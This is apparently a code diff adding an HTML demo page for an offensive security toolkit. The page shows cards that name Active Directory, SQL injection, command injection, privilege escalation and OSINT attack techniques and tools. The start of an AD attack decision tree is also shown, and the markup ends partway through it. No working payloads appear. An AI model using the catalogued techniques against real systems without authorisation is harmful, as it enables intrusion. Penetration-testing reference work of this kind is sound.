@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Mahdiesta Arsenal — Demo</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap');
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;cursor:none!important;}
+:root{
+  --bg:#050508;--bg2:#0a0a10;--bg3:#111118;--bg4:#1a1a28;
+  --red:#ff2d55;--green:#00ff9d;--blue:#00d4ff;
+  --orange:#ff9500;--purple:#bf5af2;--yellow:#ffd60a;
+  --text:#f0f0f5;--text2:#8888a0;--text3:#444460;
+  --brd:#252535;--brd2:#353548;
+  --sans:'Inter',-apple-system,sans-serif;
+  --mono:'JetBrains Mono','Courier New',monospace;
+}
+html,body{width:1280px;height:720px;overflow:hidden;background:#000;font-family:var(--sans);-webkit-font-smoothing:antialiased;}
+#stage{width:1280px;height:720px;position:relative;overflow:hidden;background:var(--bg);}
+#chrome{height:36px;background:#0d0d14;border-bottom:1px solid var(--brd);display:flex;align-items:center;padding:0 14px;gap:10px;position:relative;z-index:500;flex-shrink:0;}
+.tls{display:flex;gap:7px;align-items:center;}
+.tl{width:11px;height:11px;border-radius:50%;}
+.tl.r{background:#ff5f57;}.tl.y{background:#febc2e;}.tl.g{background:#28c840;}
+#urlBar{flex:1;height:23px;background:#181825;border-radius:5px;display:flex;align-items:center;padding:0 10px;gap:6px;font:11px/1 var(--mono);color:#555;margin:0 48px;border:1px solid var(--brd);}
+.url-lock{font-size:9px;color:var(--green);}
+#urlText{font-size:10.5px;color:#666;transition:color .3s;}
+#modeTag{font:700 9px/1 var(--mono);letter-spacing:.8px;text-transform:uppercase;background:rgba(255,45,85,.12);color:var(--red);border:1px solid rgba(255,45,85,.25);border-radius:4px;padding:3px 9px;}
+#vp{width:1280px;height:684px;position:relative;overflow:hidden;}
+#zoomWrap{position:absolute;inset:0;transform-origin:center center;will-change:transform;}
+#cursorLayer{position:absolute;inset:0;z-index:9000;pointer-events:none;overflow:visible;}
+#cur{position:absolute;top:0;left:0;width:20px;height:20px;transform:translate(-9999px,-9999px);transition:transform .5s cubic-bezier(.25,.1,.25,1);filter:drop-shadow(0 0 6px rgba(0,212,255,.8));will-change:transform;}
+#cur svg{width:20px;height:20px;}
+#curRing{position:absolute;top:-9px;left:-9px;width:38px;height:38px;border-radius:50%;border:1.5px solid rgba(0,212,255,.35);transform:translate(-9999px,-9999px);transition:transform .62s cubic-bezier(.25,.1,.25,1),width .25s,height .25s,border-color .25s;will-change:transform;}
+#curRing.hover{width:50px;height:50px;top:-16px;left:-16px;border-color:rgba(0,212,255,.7);}
+.scene{position:absolute;inset:0;opacity:0;pointer-events:none;transition:opacity .4s cubic-bezier(.4,0,.2,1);background:var(--bg);overflow:hidden;}
+.scene.active{opacity:1;pointer-events:all;}
+#scan{position:absolute;inset:0;z-index:8900;pointer-events:none;background:repeating-linear-gradient(transparent,transparent 2px,rgba(0,0,0,.03) 2px,rgba(0,0,0,.03) 4px);}
+#flash{position:absolute;inset:0;z-index:8000;pointer-events:none;background:rgba(255,255,255,0);transition:background .18s ease;}
+#flash.on{background:rgba(255,255,255,.13);}
+#prog{position:absolute;bottom:0;left:0;height:2px;background:linear-gradient(90deg,var(--red),var(--purple),var(--blue));z-index:9100;transition:width .5s linear;width:0%;box-shadow:0 0 8px var(--red);}
+#keyBadge{position:absolute;bottom:28px;right:36px;z-index:9200;background:#14141e;border:2px solid var(--blue);border-radius:9px;padding:9px 16px;font:700 18px/1 var(--mono);color:var(--blue);box-shadow:0 0 24px rgba(0,212,255,.35);opacity:0;transform:scale(.82) translateY(6px);transition:opacity .16s,transform .16s;pointer-events:none;}
+#keyBadge.show{opacity:1;transform:scale(1) translateY(0);}
+#rec{position:absolute;top:10px;right:16px;z-index:9200;display:flex;align-items:center;gap:5px;font:700 9px/1 var(--mono);color:var(--red);letter-spacing:.8px;}
+.rdot{width:7px;height:7px;border-radius:50%;background:var(--red);animation:blink 1.1s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+#toast{position:absolute;top:50%;left:50%;z-index:9500;transform:translate(-50%,-50%) scale(.8);background:var(--green);color:#050508;padding:13px 26px;border-radius:8px;font:700 13px/1 var(--sans);opacity:0;pointer-events:none;transition:all .22s;box-shadow:0 0 36px rgba(0,255,157,.5);white-space:nowrap;}
+#toast.show{opacity:1;transform:translate(-50%,-50%) scale(1);}
+.ripple{position:absolute;border-radius:50%;width:8px;height:8px;pointer-events:none;z-index:9100;background:rgba(0,212,255,.55);animation:rippleAnim .48s ease-out forwards;}
+@keyframes rippleAnim{0%{opacity:.8;transform:translate(-50%,-50%) scale(1);}100%{opacity:0;transform:translate(-50%,-50%) scale(6);}}
+
+/* ── S1: HOMEPAGE ── */
+.topbar{height:52px;background:rgba(5,5,8,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--brd);display:flex;align-items:center;padding:0 22px;gap:12px;position:sticky;top:0;z-index:100;}
+.srch-wrap{flex:1;max-width:500px;position:relative;}
+.srch-box{width:100%;padding:.58rem 1rem .58rem 2.3rem;background:var(--bg3);border:1px solid var(--brd2);border-radius:9px;color:var(--text);font:13px/1 var(--mono);outline:none;transition:border-color .22s,box-shadow .22s;}
+.srch-box.lit{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,212,255,.1);}
+.srch-ico{position:absolute;left:.8rem;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px;}
+.srch-hint{position:absolute;right:.8rem;top:50%;transform:translateY(-50%);font:11px/1 var(--mono);color:var(--text3);background:var(--bg4);padding:.14rem .38rem;border-radius:4px;border:1px solid var(--brd);}
+.t-btn{width:38px;height:38px;border-radius:9px;border:1px solid var(--brd);background:var(--bg3);color:var(--text3);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:15px;transition:all .22s;flex-shrink:0;}
+.t-btn.lit{border-color:var(--blue);color:var(--blue);background:rgba(0,212,255,.07);}
+.hero{text-align:center;padding:1.8rem 1.5rem 1rem;}
+.h-prompt{font:800 2.1rem/1.1 var(--mono);display:flex;align-items:center;justify-content:center;flex-wrap:wrap;gap:.08em;margin-bottom:.5rem;}
+.h-user{color:var(--green);}.h-at,.h-sep{color:var(--text3);}.h-host,.h-cmd{color:var(--text);}.h-hash{color:var(--red);}
+.h-cur{display:inline-block;width:.48em;height:1.05em;background:var(--red);vertical-align:middle;margin-left:2px;animation:bl 1s step-end infinite;}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
+.h-sub{font:500 10px/1 var(--mono);color:var(--text3);letter-spacing:.18em;text-transform:uppercase;}
+.stats-row{display:flex;align-items:center;justify-content:center;gap:8px;margin:.7rem auto .75rem;}
+.s-pill{display:flex;align-items:center;gap:6px;background:var(--bg3);border:1px solid var(--brd2);border-radius:8px;padding:4px 13px;font:600 11px/1 var(--sans);color:var(--text2);}
+.s-pill b{font:700 13px/1 var(--mono);color:var(--green);}
+.filt-row{display:flex;gap:.4rem;flex-wrap:wrap;justify-content:center;max-width:900px;margin:0 auto .7rem;padding:0 1.5rem;}
+.fb{padding:.36rem .82rem;border-radius:8px;border:1px solid var(--brd);background:var(--bg3);color:var(--text3);font:600 .72rem/1 var(--sans);cursor:pointer;transition:all .2s;}
+.fb.on{border-color:rgba(255,45,85,.4);color:var(--red);background:rgba(255,45,85,.08);}
+.fcnt{display:inline-block;margin-left:.28rem;padding:.05rem .3rem;background:rgba(255,255,255,.04);border-radius:4px;font:.63rem/1 var(--mono);color:var(--text3);}
+.fb.on .fcnt{background:rgba(255,45,85,.1);color:var(--red);}
+.cards-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:.68rem;max-width:1230px;margin:0 auto;padding:0 1.3rem 1.5rem;}
+.card{background:var(--bg3);border:1px solid var(--brd);border-radius:12px;padding:.9rem;position:relative;overflow:hidden;cursor:pointer;transition:all .28s cubic-bezier(.4,0,.2,1);}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2.5px;}
+.card.ad::before{background:linear-gradient(90deg,var(--blue),var(--purple));}.card.sql::before{background:linear-gradient(90deg,var(--red),var(--orange));}
+.card.web::before{background:linear-gradient(90deg,var(--orange),var(--yellow));}.card.priv::before{background:linear-gradient(90deg,var(--red),var(--purple));}
+.card.os::before{background:linear-gradient(90deg,var(--green),var(--blue));}
+.card:hover,.card.hl{transform:translateY(-2px);border-color:rgba(255,45,85,.25);box-shadow:0 10px 32px -10px rgba(0,0,0,.7),0 0 18px rgba(255,45,85,.08);}
+.card.dim{opacity:.18;transform:none!important;filter:grayscale(.4);}
+.card.spot{border-color:var(--blue)!important;box-shadow:0 0 0 2px rgba(0,212,255,.18),0 16px 40px -8px rgba(0,212,255,.25)!important;transform:translateY(-3px)!important;}
+.ci{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:.9rem;margin-bottom:.5rem;}
+.ci.ad{background:rgba(0,212,255,.1);}.ci.sql{background:rgba(255,45,85,.1);}.ci.web{background:rgba(255,149,0,.1);}.ci.priv{background:rgba(191,90,242,.1);}.ci.os{background:rgba(0,255,157,.1);}
+.cn{font:.8rem/1 var(--sans);font-weight:700;color:var(--text);margin-bottom:.2rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.cd2{font:.68rem/1.42 var(--sans);color:var(--text3);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden;}
+.cm2{margin-top:.45rem;padding-top:.38rem;border-top:1px solid var(--brd);display:flex;gap:.25rem;flex-wrap:wrap;}
+.mt{font:.58rem/1 var(--mono);font-weight:500;padding:.09rem .3rem;border-radius:3px;background:rgba(255,255,255,.03);border:1px solid var(--brd);color:var(--text3);}
+.mt.g{color:var(--green);border-color:rgba(0,255,157,.14);background:rgba(0,255,157,.04);}
+#srPanel{position:absolute;top:96px;left:50%;transform:translateX(-50%);width:740px;z-index:200;background:var(--bg3);border:1px solid var(--brd2);border-radius:11px;padding:.75rem;box-shadow:0 20px 60px -12px rgba(0,0,0,.85);display:none;}
+.sr-hdr{font:.6rem/1 var(--mono);color:var(--text3);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.45rem;}
+.sr-chip{display:inline-flex;align-items:center;gap:.35rem;padding:.26rem .58rem;border-radius:6px;border:1px solid var(--brd);background:rgba(0,0,0,.3);color:var(--text2);font:.7rem/1 var(--sans);margin:.15rem;cursor:pointer;transition:all .16s;}
+.sr-chip.hl{border-color:var(--blue);color:var(--blue);background:rgba(0,212,255,.06);}
+.sr-tag{font:.57rem/1 var(--mono);padding:.06rem .26rem;border-radius:3px;background:rgba(255,45,85,.1);color:var(--red);}
+.sr-code{font:.65rem/1 var(--mono);color:var(--text);max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+mark{background:rgba(255,45,85,.22);border-radius:2px;padding:0 1px;color:inherit;}
+
+/* ── S2: ADBOOM ── */
+.ab-wrap{display:flex;height:684px;overflow:hidden;position:relative;}
+.ab-hdr{position:absolute;top:0;left:0;right:0;height:48px;background:linear-gradient(180deg,var(--bg3),var(--bg));border-bottom:1px solid var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 18px;z-index:50;}
+.ab-title{font:700 14px/1 var(--sans);background:linear-gradient(90deg,var(--red),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.ab-stats{display:flex;gap:8px;}
+.ab-st{background:var(--bg2);border:1px solid var(--brd);border-radius:10px;padding:3px 10px;font:.65rem/1 var(--sans);color:var(--text2);}
+.ab-st b{font:700 13px/1 var(--mono);color:var(--green);}
+.ab-st b.rc{color:var(--yellow);transition:color .3s;}
+.mode-tgl{display:flex;background:var(--bg2);border:1px solid var(--brd);border-radius:6px;overflow:hidden;}
+.m-btn{padding:6px 13px;background:transparent;border:none;color:var(--text2);font:.67rem/1 var(--sans);cursor:pointer;font-family:var(--sans);}
+.m-btn.act{background:var(--red);color:#fff;}
+.ab-side{width:320px;background:var(--bg2);border-right:1px solid var(--brd);flex-shrink:0;overflow-y:auto;padding:62px 12px 14px;display:flex;flex-direction:column;gap:10px;}
+.ab-panel{background:var(--bg3);border:1px solid var(--brd);border-radius:8px;}
+.ab-ph{background:var(--bg4);padding:7px 11px;border-bottom:1px solid var(--brd);display:flex;align-items:center;gap:7px;}
+.ab-ph h2{font:.62rem/1 var(--sans);text-transform:uppercase;letter-spacing:.08em;color:var(--text3);}
+.ab-pb{padding:9px 10px;}
+.st-row{display:flex;justify-content:space-between;padding:4px 8px;background:var(--bg2);border-radius:4px;font:.67rem/1 var(--sans);margin-bottom:4px;}
+.st-row:last-child{margin-bottom:0;}
+.st-l{color:var(--text3);}.st-v{color:var(--green);font-weight:500;font-family:var(--mono);font-size:.65rem;transition:color .3s;}.st-v.unset{color:var(--text3);font-style:italic;}
+.d-node{background:var(--bg2);border:1px solid var(--brd);border-radius:6px;padding:10px;margin-bottom:7px;transition:all .28s;}
+.d-node:last-child{margin-bottom:0;}
+.d-node.active{border-color:var(--blue);box-shadow:0 0 12px rgba(0,212,255,.18);}
+.d-node.done{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,157,.1);}
+.d-node.locked{opacity:.3;pointer-events:none;}
+.d-ax{display:inline-block;font:.58rem/1 var(--mono);font-weight:700;padding:1px 5px;background:var(--purple);color:#fff;border-radius:3px;margin-right:6px;}
+.d-q{font:.7rem/1.38 var(--sans);color:var(--text);margin-bottom:8px;margin-top:3px;}
+.d-opts{display:flex;flex-wrap:wrap;gap:4px;}
+.d-opt{padding:4px 8px;background:var(--bg3);border:1px solid var(--brd);border-radius:4px;color:var(--text2);font:.64rem/1 var(--sans);cursor:pointer;transition:all .14s;}
+.d-opt:hover{border-color:var(--blue);color:var(--blue);}
+.d-opt.sel{background:var(--red);border-color:var(--red);color:#fff;}
+.cfg-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;}
+.cfg-f label{display:block;font:.58rem/1 var(--mono);color:var(--text3);text-transform:uppercase;margin-bottom:3px;}
+.c-inp{width:100%;padding:6px 7px;background:var(--bg);border:1px solid var(--brd);border-radius:4px;color:var(--green);font:.65rem/1 var(--mono);outline:none;transition:border-color .14s,box-shadow .14s;}
+.c-inp:focus{border-color:var(--red);box-shadow:0 0 0 2px rgba(255,45,85,.12);}
+.c-inp.filled{border-color:var(--green);background:rgba(0,255,157,.04);}
+.ph-tabs{display:flex;gap:4px;padding:9px 14px;background:var(--bg3);border-bottom:1px solid var(--brd);flex-shrink:0;overflow-x:auto;}
+.ptab{padding:6px 12px;background:var(--bg4);border:1px solid var(--brd);border-radius:5px;font:.66rem/1 var(--sans);color:var(--text2);cursor:pointer;white-space:nowrap;transition:all .14s;}
+.ptab.act{background:var(--red);border-color:var(--red);color:#fff;}
+.pcnt{margin-left:4px;padding:1px 5px;background:rgba(255,255,255,.15);border-radius:5px;font:.6rem/1 var(--mono);}
+.ab-main{flex:1;overflow:hidden;display:flex;flex-direction:column;padding-top:48px;}
+.cmd-scroll{flex:1;overflow-y:auto;padding:12px 14px;}
+.cmd-card{background:var(--bg4);border:1px solid var(--brd);border-radius:8px;padding:12px;margin-bottom:9px;transition:all .22s;border-left:3px solid transparent;}
+.cmd-card:hover{border-color:rgba(255,45,85,.35);transform:translateY(-1px);}
+.cmd-card.noisy{border-left-color:var(--red);}.cmd-card.stealthy{border-left-color:var(--green);}.cmd-card.moderate{border-left-color:var(--orange);}
+.cmd-card.copied-fx{border-color:var(--green)!important;box-shadow:0 0 18px rgba(0,255,157,.28)!important;}
+.ch{display:flex;justify-content:space-between;gap:8px;margin-bottom:6px;}
+.ct{font:.78rem/1 var(--sans);font-weight:700;color:var(--red);}.cid{font:.62rem/1 var(--mono);color:var(--text3);}
+.cbadges{display:flex;gap:3px;flex-wrap:wrap;}
+.cb{font:.58rem/1 var(--sans);font-weight:700;padding:2px 5px;border-radius:3px;}
+.cb.os-b{background:rgba(255,214,10,.12);color:var(--yellow);}.cb.n-low{background:rgba(0,255,157,.1);color:var(--green);}.cb.n-med{background:rgba(255,149,0,.1);color:var(--orange);}.cb.n-hi{background:rgba(255,45,85,.1);color:var(--red);}
+.cd-t{font:.65rem/1.38 var(--sans);color:var(--text2);margin-bottom:7px;}
+.cmd-box{background:var(--bg);border:1px solid var(--brd);border-radius:5px;padding:8px 10px;margin-bottom:8px;}
+.cmd-txt{font:.68rem/1.6 var(--mono);color:var(--green);white-space:pre-wrap;word-break:break-word;}
+.cmd-txt .v{color:var(--red);font-weight:700;transition:color .25s,background .25s,border-radius .25s;}
+.cmd-txt .v.hi{color:var(--green);background:rgba(0,255,157,.14);border-radius:3px;padding:0 2px;}
+.copy-btn{width:100%;padding:7px;background:linear-gradient(135deg,var(--red),var(--purple));border:none;border-radius:5px;color:#fff;font:.66rem/1 var(--sans);font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:.06em;transition:opacity .14s;}
+.copy-btn:hover{opacity:.88;}
+.copy-btn.copied{background:linear-gradient(135deg,var(--green),#00a06e);}
+
+/* ── S3: SQLi OPERATOR ── */
+#s3{display:flex;flex-direction:column;}
+.sq-hdr{height:48px;background:linear-gradient(180deg,var(--bg3),var(--bg));border-bottom:1px solid var(--red);display:flex;align-items:center;justify-content:space-between;padding:0 18px;flex-shrink:0;}
+.sq-title{font:700 14px/1 var(--sans);background:linear-gradient(90deg,var(--red),var(--orange));-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.sq-pill-row{display:flex;gap:6px;}
+.sq-hpill{background:var(--bg2);border:1px solid var(--brd);border-radius:8px;padding:3px 10px;font:.62rem/1 var(--sans);color:var(--text2);}
+.sq-hpill b{font:700 11px/1 var(--mono);color:var(--red);}
+.sq-body{display:flex;flex:1;overflow:hidden;}
+.sq-side{width:235px;background:var(--bg2);border-right:1px solid var(--brd);padding:12px;flex-shrink:0;display:flex;flex-direction:column;gap:4px;overflow-y:auto;}
+.sq-sect{font:.57rem/1 var(--mono);color:var(--text3);text-transform:uppercase;letter-spacing:.08em;margin-top:8px;margin-bottom:3px;}
+.sq-sect:first-child{margin-top:0;}
+.sq-types{display:flex;flex-direction:column;gap:3px;}
+.sq-type{padding:7px 10px;background:var(--bg3);border:1px solid var(--brd);border-radius:5px;color:var(--text2);font:.67rem/1 var(--sans);cursor:pointer;text-align:left;transition:all .14s;}
+.sq-type.act{background:rgba(255,45,85,.08);border-color:rgba(255,45,85,.3);color:var(--red);}
+.sq-inp{width:100%;padding:6px 8px;background:var(--bg);border:1px solid var(--brd);border-radius:4px;color:var(--text);font:.61rem/1 var(--mono);outline:none;transition:border-color .14s;}
+.sq-inp.filled,.sq-inp:focus{border-color:var(--red);}
+.sq-waf-row{display:flex;flex-direction:column;gap:3px;}
+.sq-tog{padding:5px 8px;background:var(--bg3);border:1px solid var(--brd);border-radius:4px;color:var(--text3);font:.61rem/1 var(--mono);cursor:pointer;text-align:left;transition:all .14s;}
+.sq-tog.on{background:rgba(0,255,157,.06);border-color:rgba(0,255,157,.3);color:var(--green);}
+.sq-gen{width:100%;padding:9px;margin-top:6px;background:linear-gradient(135deg,var(--red),var(--orange));border:none;border-radius:5px;color:#fff;font:.68rem/1 var(--sans);font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:.06em;transition:opacity .14s;}
+.sq-gen:hover{opacity:.88;}
+.sq-meta{margin-top:auto;padding-top:8px;display:flex;flex-direction:column;gap:0;}
+.sq-mrow{display:flex;justify-content:space-between;font:.6rem/1 var(--sans);padding:4px 0;border-bottom:1px solid var(--brd);color:var(--text3);}
+.sq-mrow:last-child{border-bottom:none;}
+.sq-mrow span:last-child{color:var(--text2);font:.58rem/1 var(--mono);}
+.sq-main{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+.sq-toolbar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;background:var(--bg3);border-bottom:1px solid var(--brd);flex-shrink:0;}
+.sq-cnt{font:.63rem/1 var(--mono);color:var(--text3);}
+.sq-ttag{font:.57rem/1 var(--mono);font-weight:700;padding:2px 7px;margin-left:8px;background:rgba(255,45,85,.1);border:1px solid rgba(255,45,85,.2);border-radius:3px;color:var(--red);}
+.sq-copy-all{padding:5px 12px;background:linear-gradient(135deg,var(--red),var(--purple));border:none;border-radius:5px;color:#fff;font:.63rem/1 var(--sans);font-weight:700;cursor:pointer;transition:opacity .14s;}
+.sq-copy-all:hover{opacity:.88;}
+.sq-payloads{flex:1;overflow-y:auto;padding:10px 14px;display:flex;flex-direction:column;gap:5px;}
+.sq-empty{color:var(--text3);font:.68rem/1.6 var(--mono);padding:30px 0;text-align:center;}
+.sq-item{background:var(--bg4);border:1px solid var(--brd);border-radius:6px;padding:9px 11px;display:flex;align-items:flex-start;justify-content:space-between;gap:8px;opacity:0;transform:translateX(-10px);transition:opacity .22s,transform .22s;}
+.sq-item.show{opacity:1;transform:translateX(0);}
+.sq-code{font:.65rem/1.5 var(--mono);color:var(--green);flex:1;white-space:pre-wrap;word-break:break-all;}
+.sq-icopy{flex-shrink:0;padding:3px 7px;background:rgba(255,45,85,.08);border:1px solid rgba(255,45,85,.18);border-radius:3px;color:var(--red);font:.57rem/1 var(--sans);cursor:pointer;transition:all .14s;margin-top:2px;}
+.sq-icopy:hover{background:var(--red);color:#fff;}
+
+/* ── S4: PrivEsc Toolkit (iframe) ── */
+#s4{overflow:hidden;}
+</style>
+</head>
+<body>
+<div id="stage">
+  <div id="chrome">
+    <div class="tls"><div class="tl r"></div><div class="tl y"></div><div class="tl g"></div></div>
+    <div id="urlBar">
+      <span class="url-lock">🔒</span>
+      <span id="urlText">mahdiesta-arsenal / index.html</span>
+    </div>
+    <div id="modeTag">DARK</div>
+  </div>
+
+  <div id="vp">
+    <div id="zoomWrap">
+
+    <!-- ══ S1: HOMEPAGE ══ -->
+    <div class="scene active" id="s1">
+      <div class="topbar">
+        <div class="srch-wrap">
+          <span class="srch-ico">⌕</span>
+          <input class="srch-box" id="srchBox" type="text" placeholder="Search commands, tools, techniques…" readonly>
+          <span class="srch-hint">/</span>
+        </div>
+        <button class="t-btn" id="tBtn">☀</button>
+        <button class="t-btn">?</button>
+      </div>
+      <div class="hero">
+        <div class="h-prompt">
+          <span class="h-user">mahdiesta</span><span class="h-at">@</span><span class="h-host">arsenal</span><span class="h-sep">:~</span><span class="h-hash">#</span>&nbsp;<span class="h-cmd" id="heroCmd"></span><span class="h-cur"></span>
+        </div>
+        <div class="h-sub">Mahdiesta Arsenal &mdash; Offensive Security Toolkit</div>
+      </div>
+      <div class="stats-row">
+        <div class="s-pill"><b id="sc1">0</b>&nbsp;Commands</div>
+        <div class="s-pill"><b id="sc2">0</b>&nbsp;Tools</div>
+        <div class="s-pill"><b>100%</b>&nbsp;Offline</div>
+        <div class="s-pill"><b>100%</b>&nbsp;Free &amp; Open Source</div>
+      </div>
+      <div class="filt-row">
+        <button class="fb on" id="fa">All<span class="fcnt">14</span></button>
+        <button class="fb" id="fad">Active Directory<span class="fcnt">5</span></button>
+        <button class="fb" id="fsq">SQL Injection<span class="fcnt">2</span></button>
+        <button class="fb" id="fwb">Web<span class="fcnt">4</span></button>
+        <button class="fb" id="fos">OSINT &amp; Dorks<span class="fcnt">1</span></button>
+        <button class="fb" id="fpr">PrivEsc<span class="fcnt">2</span></button>
+      </div>
+      <div class="cards-grid">
+        <div class="card ad" data-cat="ad" id="cAD"><div class="ci ad">🏰</div><div class="cn">Active Directory Boom</div><div class="cd2">AD PenTest Intelligence Engine. 325+ commands with decision trees &amp; live relevance scoring.</div><div class="cm2"><span class="mt g">~467 cmds</span><span class="mt">nxc</span><span class="mt">mimikatz</span></div></div>
+        <div class="card ad" data-cat="ad" id="cADCS"><div class="ci ad">🏅</div><div class="cn">ADCS Attack Reference</div><div class="cd2">ESC1-ESC16, shadow credentials, PassTheCert, real HTB/Vulnlab walkthroughs.</div><div class="cm2"><span class="mt g">~180 cmds</span><span class="mt">certipy</span><span class="mt">rubeus</span></div></div>
+        <div class="card ad" data-cat="ad" id="cNXC"><div class="ci ad">🔌</div><div class="cn">NetExec Guide</div><div class="cd2">261 commands — SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS.</div><div class="cm2"><span class="mt g">261 cmds</span><span class="mt">nxc</span><span class="mt">lsassy</span></div></div>
+        <div class="card ad" data-cat="ad" id="cBH"><div class="ci ad">🩸</div><div class="cn">BloodHound Cheat Sheet</div><div class="cd2">Cypher queries, attack paths, kerberoast chains with live variable sync.</div><div class="cm2"><span class="mt g">200+ cmds</span><span class="mt">bloodhound</span><span class="mt">cypher</span></div></div>
+        <div class="card sql" data-cat="sql" id="cSQLI"><div class="ci sql">💉</div><div class="cn">SQL Injection Operator</div><div class="cd2">10+ generators, WAF transformer, sqlmap builder. Union/Blind/OOB/Stacked.</div><div class="cm2"><span class="mt g">1000+ payloads</span><span class="mt">sqlmap</span><span class="mt">union</span></div></div>
+        <div class="card sql" data-cat="sql" id="cSRCE"><div class="ci sql">💣</div><div class="cn">SQL Injection RCE</div><div class="cd2">xp_cmdshell, UDF, INTO OUTFILE, COPY TO PROGRAM, Oracle Java abuse.</div><div class="cm2"><span class="mt g">80+ cmds</span><span class="mt">xp_cmdshell</span><span class="mt">udf</span></div></div>
+        <div class="card web" data-cat="web" id="cCMDI"><div class="ci web">🧨</div><div class="cn">Command Injection</div><div class="cd2">227 techniques, OS-specific payloads, OOB/DNS/sleep, shell generator.</div><div class="cm2"><span class="mt g">227 cmds</span><span class="mt">linux</span><span class="mt">powershell</span></div></div>
+        <div class="card web" data-cat="web" id="cWEB"><div class="ci web">⚡</div><div class="cn">Web Arsenal</div><div class="cd2">XSS, SSRF, XXE, LFI/RFI, IDOR, template injection and more.</div><div class="cm2"><span class="mt g">400+ cmds</span><span class="mt">xss</span><span class="mt">ssrf</span></div></div>
+        <div class="card priv" data-cat="priv" id="cPWIN"><div class="ci priv">🪟</div><div class="cn">Windows PrivEsc</div><div class="cd2">Smart analyzer — paste systeminfo, get exploit candidates instantly.</div><div class="cm2"><span class="mt g">200+ cmds</span><span class="mt">winpeas</span><span class="mt">token</span></div></div>
+        <div class="card priv" data-cat="priv" id="cPLIN"><div class="ci priv">🐧</div><div class="cn">Linux PrivEsc</div><div class="cd2">SUID/SGID, capabilities, cron, sudo abuse, kernel exploit chains.</div><div class="cm2"><span class="mt g">150+ cmds</span><span class="mt">linpeas</span><span class="mt">suid</span></div></div>
+        <div class="card ad" data-cat="ad" id="cBLD"><div class="ci ad">🩸</div><div class="cn">bloodyAD Arsenal</div><div class="cd2">DACL abuse, GenericWrite, ForceChangePassword, LDAP privilege escalation.</div><div class="cm2"><span class="mt g">150+ cmds</span><span class="mt">bloodyad</span><span class="mt">dacl</span></div></div>
+        <div class="card os" data-cat="osint" id="cOSI"><div class="ci os">🔎</div><div class="cn">OSINT Dorks</div><div class="cd2">Google, Shodan, Censys, GitHub dorks for target recon and exposure.</div><div class="cm2"><span class="mt g">300+ dorks</span><span class="mt">google</span><span class="mt">shodan</span></div></div>
+        <div class="card web" data-cat="web" id="cAUTH"><div class="ci web">🔑</div><div class="cn">Auth Bypass</div><div class="cd2">JWT manipulation, OAuth abuse, SAML attacks, SSO bypass techniques.</div><div class="cm2"><span class="mt g">120+ cmds</span><span class="mt">jwt</span><span class="mt">oauth</span></div></div>
+        <div class="card web" data-cat="web" id="cWEN"><div class="ci web">🌐</div><div class="cn">Web Enumeration</div><div class="cd2">Directory brute-force, header analysis, endpoint discovery, API fuzzing.</div><div class="cm2"><span class="mt g">150+ cmds</span><span class="mt">ffuf</span><span class="mt">gobuster</span></div></div>
+      </div>
+      <div id="srPanel">
+        <div class="sr-hdr" id="srHdr"></div>
+        <div id="srChips"></div>
+      </div>
+    </div>
+
+    <!-- ══ S2: ADBOOM ══ -->
+    <div class="scene" id="s2">
+      <div class="ab-wrap">
+        <div class="ab-hdr">
+          <div>
+            <div class="ab-title">⚡ AD Attacks Arsenal</div>
+            <div style="font:.58rem/1 var(--sans);color:var(--text3);margin-top:2px;">BY @MAHDIESTA</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:12px;">
+            <div class="mode-tgl"><button class="m-btn act">🧭 Guided</button><button class="m-btn">⚡ Expert</button></div>
+            <div class="ab-stats">
+              <div class="ab-st"><b>458</b> Total</div>
+              <div class="ab-st"><b>458</b> Match</div>
+              <div class="ab-st"><b class="rc" id="rc">0</b> Ready</div>
+            </div>
+          </div>
+        </div>
+        <div class="ab-side">
+          <div class="ab-panel">
+            <div class="ab-ph"><span style="font-size:.78rem">📊</span><h2>Current State</h2></div>
+            <div class="ab-pb">
+              <div class="st-row"><span class="st-l">Access</span><span class="st-v unset" id="sv-ac">Not set</span></div>
+              <div class="st-row"><span class="st-l">Identity</span><span class="st-v unset" id="sv-id">Not set</span></div>
+              <div class="st-row"><span class="st-l">Cred Type</span><span class="st-v unset" id="sv-cr">Not set</span></div>
+              <div class="st-row"><span class="st-l">LHOST</span><span class="st-v unset" id="sv-lh">Not set</span></div>
+              <div class="st-row"><span class="st-l">DC IP</span><span class="st-v unset" id="sv-dc">Not set</span></div>
+            </div>
+          </div>
+          <div class="ab-panel">
+            <div class="ab-ph"><span style="font-size:.78rem">🌲</span><h2>Decision Tree</h2></div>
+            <div class="ab-pb">
+              <div class="d-node active" id="dn1">
+                <div style="margin-bottom:6px;"><span class="d-ax">A</span><span style="font:.58rem/1 var(--mono);color:var(--text3);">Attack Position</span></div>
+                <div class="d-q">Where are you attacking from?</div>
+                <div class="d-opts">
+                  <button class="d-opt">🌍 External</button>
+                  <button class="d-opt" id="dn1-int">🔒 Internal (Auth)</button>
